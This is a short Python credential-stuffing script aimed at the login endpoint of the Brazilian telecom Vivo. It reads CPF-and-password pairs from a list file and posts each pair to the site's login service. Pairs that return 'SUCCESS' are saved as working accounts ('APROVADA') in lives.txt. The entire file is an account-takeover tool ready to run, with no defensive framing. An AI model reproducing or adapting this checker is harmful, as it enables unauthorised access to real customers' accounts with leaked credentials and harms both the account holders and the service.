import requests
import colorama
import os
from colorama import Fore, Back, Style
colorama.init()

os.system("cls")
a = open("lista.txt", "r")

file = [s.strip() for s in a.readlines()]

for lines in file:
    combo = lines.split('|')
    h = {'Host': 'login.vivo.com.br', 'Connection': 'keep-alive', 'Referer': 'https://login.vivo.com.br/loginmarca/appmanager/marca/publico', 'Accept-Encoding': 'gzip, deflate', 'Origin': 'https://login.vivo.com.br'}
    p = {'cpf': combo[0],
        'senha': combo[1],
        'origem': 'null',
        'associaMobileConnect': 'false',
}
    r = requests.post('https://login.vivo.com.br/loginmarca/br/com/vivo/marca/portlets/loginunificado/doLoginConvergente.do',headers=h,data=p)
    resp_json = r.json()
    cod = resp_json['message']      
    print(r.text)
   # r2 = requests.get('')
    if """SUCCESS""" in r.text:
        print(Fore.GREEN + f"APROVADA(!): {combo[0]}|{combo[1]}")
        f = open("lives.txt", "a", encoding="utf8")
        f.write(f"APROVADA(!): {combo[0]}|{combo[1]}\n\n")
        f.close()
    else:
        print(Fore.RED + f'Login Inválido!')




    
    

            













